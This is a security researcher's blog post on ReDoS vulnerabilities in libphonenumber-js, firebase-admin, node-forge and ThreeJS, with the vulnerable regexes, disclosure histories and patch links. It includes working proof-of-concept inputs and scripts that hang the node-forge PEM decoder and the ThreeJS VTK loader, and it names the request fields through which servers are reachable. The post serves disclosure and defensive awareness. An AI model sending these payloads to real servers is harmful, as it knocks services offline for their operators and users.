---
layout: post
title: Revisiting ReDoS Attacks
subtitle: Again! Watch your regexes!
mathjax: true
tags: [Web, Exploitation]
author: m411k
---

* TOC
{:toc}

# Inception

The inception of this research was kind of a silly story. Basically I was doing an internal audit of one of my employer’s projects, and through the well-known roller coaster a researcher lives in during an audit, I came across this [ReDoS](https://en.wikipedia.org/wiki/ReDoS) attack. DoSes are not commonly of interest for a hacker that wishes for something more entertaining like an RCE, Account Takeovers and others, while on the other hand, a script kiddie might be interested in this family of attacks —non-interestingly, the DDoS variant. Rant aside, the ReDoS variant seemed more intellectually engaging than the others. This led us (me, [Ayoub](https://x.com/Mr_nyly), [Mokhtari](https://x.com/0xmokhtari)) to find this variant in a multitude of software, specifically in the JS world (no surprise ¯\_(ツ)_/¯), and we hope this is a warning call for a more security-aware, wide-view development and assessment).

> If I have seen further [than others], it is by standing on the shoulders of giants. - Newton
> 

These findings wouldn’t been possible for what previous researchers have done before us, especially the USENIX Security '18 - “[Freezing the Web: A Study of ReDoS Vulnerabilities in JavaScript-based Web Servers](https://www.usenix.org/conference/usenixsecurity18/presentation/staicu)” research done by Cristian Alexandru Staicu and Michael Pradel, TU Darmstadt, and the fascinating [ReCheck](https://makenowjust-labs.github.io/recheck/) tool made by “[MakeNowJust](https://github.com/makenowjust-labs)” that helped us evaluate every regex and generate every PoC.

# Findings

## **libphonenumber-js *(≈ 12M weekly downloads)***

One of the first target was the [libphonenumber-js](https://www.npmjs.com/package/libphonenumber-js) package, we didn’t got to it directly, it started with a [NestJS](https://github.com/nestjs/nest) web application that uses [class-validator](https://www.npmjs.com/package/class-validator)’s `IsPhoneNumber` [decorator](https://www.npmjs.com/package/class-validator#:~:text=is%20a%20locale.-,%40IsPhoneNumber,-(region%3A%20string)) which in [turn uses](https://github.com/typestack/class-validator/blob/977d2c707930db602b6450d0c03ee85c70756f1f/src/decorator/string/IsPhoneNumber.ts#L21) libphonenumber-js’s `parsePhoneNumber` function, this was the source, now to find the vulnerable we have to dig deeper.

Digging deeper we found that libphonenumber-js handles a not so familiar -for me the least- syntax which is the tel URI (e.g `tel:555-1234`) defined in the [RFC 3966](https://www.rfc-editor.org/rfc/rfc3966):

![image](/assets/img/redos_assets/image.png)

`RFC3966_DOMAINNAME_PATTERN` was dynamically built but the final regex looked as the following:

![image](/assets/img/redos_assets/image%201.png)

This regex was exponential, but it only applied to the “context” of the number, which turns out it could be appended to the number e.g `tel:555-1234;phone-context:example.com`.

Couldn’t be easier.

![image](/assets/img/redos_assets/image%202.png)

### PoC

Since this package is used by packages like `class-validator`, that's used by `NestJS` framework, our PoC uses that former package but it could also work with other [dependencies](https://www.npmleaderboard.org/).

<center>
<br />
<video height="400" controls style="max-width: 90vw;">
  <source src="/assets/img/redos_assets/poc2.mkv" type="video/mp4">
</video>
</center>

### Disclosure

We contacted the maintainer, he made it clear he will continue to ignore this issue, to his point, he seemed to have copied the logic of Google’s [libphonenumber](https://github.com/google/libphonenumber/blob/31cc877c6627768da550d83f6febefce797f5c16/java/libphonenumber/src/com/google/i18n/phonenumbers/PhoneNumberUtil.java#L336) (which seems to have the same bug —we didn’t bother to check) library, fair enough, we emailed a `class-validator` member and we still didn’t have a response, moving on to the next one.

## firebase-admin (*≈ 4M weekly downloads*)

This was rather a simple one to identify, the library’s utility function `isURL` has a vulnerable regex easily hanged by an input as small as (`https://0000000000000000000000000000$`):

[validator.ts](https://github.com/firebase/firebase-admin-node/blob/ce9de63d6e5f211d10781e26decc8f331cd61742/src/utils/validator.ts#L247)

```tsx
if (!hostname || !/^[a-zA-Z0-9]+[\w-]*([.]?[a-zA-Z0-9]+[\w-]*)*$/.test(hostname)) {
  return false;
}
```

There are a lot of sources to this sink, for instance, `admin.auth().updateUser` commonly called by the package users to update the user’s profile picture among other fields.

So basically any backend that utilizes `firebase-admin` SDK and that lets the user customize their `imageURL` would be vulnerable to an attacker freezing the server, e.g:

```tsx
await admin.auth().updateUser(uid, {
    phoneNumber: phoneNumber,
    photoURL: photoURL
});
```

### PoC

<center>
<br />
<video height="400" controls style="max-width: 90vw;">
  <source src="/assets/img/redos_assets/firebase.mkv" type="video/mp4">
</video>
</center>

### Disclosure

We disclosed the vulnerability to Google VRP and it was acknowledged by them, in fact, it was patched —silently— just last week (as of the time of writing). Here is the [patch commit](https://github.com/firebase/firebase-admin-node/commit/1bf436d40ab86709456c81d6f01211449df1ed23#:~:text=fix%3A%20Potential%20ReDos%20vulnerability%20in%20url%20validator)/[pull request #3061](https://github.com/firebase/firebase-admin-node/pull/3061).

## node-forge (*≈ 29M weekly downloads*)

This was a clear one too, the `rMessage` ([pem.js:99](https://github.com/digitalbazaar/forge/blob/6f70043a6db1abb9f3304f3d432efed3ba50fcca/lib/pem.js#L99)) in the `forge.pem.decode` function regex was also vulnerable but not exponential as the above ones (i.e. it need a bigger input):

[pem.js:104](https://github.com/digitalbazaar/forge/blob/6f70043a6db1abb9f3304f3d432efed3ba50fcca/lib/pem.js#L104)

```jsx
// ...
  var rMessage = /\s*-----BEGIN ([A-Z0-9- ]+)-----\r?\n?([\x21-\x7e\s]+?(?:\r?\n\r?\n))?([:A-Za-z0-9+\/=\s]+?)-----END \1-----/g;
  var rHeader = /([\x21-\x7e]+):\s*([\x21-\x7e\s^:]+)/;
  var rCRLF = /\r?\n/;
  var match;
  while(true) {
    match = rMessage.exec(str);
    if(!match) {
      break;
    }
// ...
```

### PoC

```jsx
import forge from 'node-forge';

const pemString = ' -----BEGIN I-----G-----END B'.repeat(800) + '\x00';

// const pemObjects = forge.pki.privateKeyFromPem(pemString);
const pemObjects1 = forge.pem.decode(pemString);
```

The function in question (`forge.pem.decode` / `forge.pki.privateKeyFromPem`) has been used in multiple OSS repositories, in fact we got here because this function was used by one of `firebase-admin` SDK functions, but it wasn’t provided with user input directly.

### Disclosure

This vulnerability was disclosed with the maintainers, with a suggested idea of a patch, but as of the time of writing, a patch/advisory is yet to be published.

## ThreeJS (*≈ 4M weekly downloads*)

The `pat3Floats` ([VTKLoader.js:116](https://github.com/mrdoob/three.js/blob/5e431fdbef63c8d5e37a55ad71c0c703a67eb989/examples/jsm/loaders/VTKLoader.js#L116)) function in ThreeJS was also vulnerable to medium sized inputs e.g `'0'.repeat(331) + '0'.repeat(331) + '0\t0' + '0'.repeat(331) + '0'`.

The vulnerable snippet of code is the following:

[VTKLoader.js:116](https://github.com/mrdoob/three.js/blob/5e431fdbef63c8d5e37a55ad71c0c703a67eb989/examples/jsm/loaders/VTKLoader.js#L116)

```jsx
// ...
const pat3Floats = /(\-?\d+\.?[\d\-\+e]*)\s+(\-?\d+\.?[\d\-\+e]*)\s+(\-?\d+\.?[\d\-\+e]*)/g;
// ...
while ( ( result = pat3Floats.exec( line ) ) !== null ) {

        if ( patWord.exec( line ) !== null ) break;

        const x = parseFloat( result[ 1 ] );
        const y = parseFloat( result[ 2 ] );
        const z = parseFloat( result[ 3 ] );
        positions.push( x, y, z );

    }
// ...
```

### PoC

```jsx
import { TextEncoder } from "node:util";
import { VTKLoader } from 'three/addons/loaders/VTKLoader.js';

const payload =
  '0'.repeat(220) +
  '0'.repeat(220) +
  '0\t0' +
  '0'.repeat(220) +
  '0';

const text =
`# vtk DataFile Version 3.0
ReDoS Test
ASCII
DATASET POLYDATA
POINTS 1 float
${payload}
`;

const encoder = new TextEncoder();
const arrayBuffer = encoder.encode(text).buffer;

new VTKLoader().parse(arrayBuffer);
```

An attacker can cause the hanging of the `VTKLoader.parse` function thus the server indefinitely when parsing a malicious `.vtk` file or whatever scenario this function is triggered in.

### Disclosure

This was promptly fixed by the ThreeJS maintainer some weeks ago, ([pull request](https://github.com/mrdoob/three.js/pull/32622)).

# Not all regexes are *dangerously* reachable

Of course it’s not the case that all regexes are vulnerable, and furthermore, your input will not always get to the vulnerable regex, an active case is the code of the new Coinbase [x402](https://www.x402.org/) protocol library implementation, it has a vulnerable regex but the character (`/`) repetition required to apply the DoS is previously removed (watch out for this, it might change 👀):

[x402HTTPResourceServer.ts:824](https://github.com/coinbase/x402/blob/9adc7d5e97a910bcf1950e2af38288ec3ee9872e/typescript/packages/core/src/http/x402HTTPResourceServer.ts#L824)

![image.png](/assets/img/redos_assets/image%203.png)

# Conclusion

These ReDoS issues stem from regex patterns prone to catastrophic backtracking, multiple overlapping quantifiers (e.g. nested `+/*` or .`*` followed by specific matchers) create exponential execution paths on adversarial near-matching inputs. JavaScript’s single-threaded nature turns seconds-long regex evaluation into full process hangs, that’s what makes them very dangerous, we think this issue is not that hard to fix (just some transpilation-time linting using the `recheck` library for example will prevent most of them, just like the compilation checks that’s been added this last decade for printf-family format strings attacks) but we don’t necessarily think that the adoption will be fast, again this [research](https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-staicu.pdf) has been done about a decade ago, but we still were able to find the same very easy to detect bug in recent software, and it’s in many other software, how do we know you say? it’s because remember the project’s I’ve been auditing, all of the first three bugs were in it, I just had to script-kid a script to detect the vulnerable regexes in the `node_modules` of that project, imagine if did a more broad scan, we hope this served as a warning call, thank you for reading!
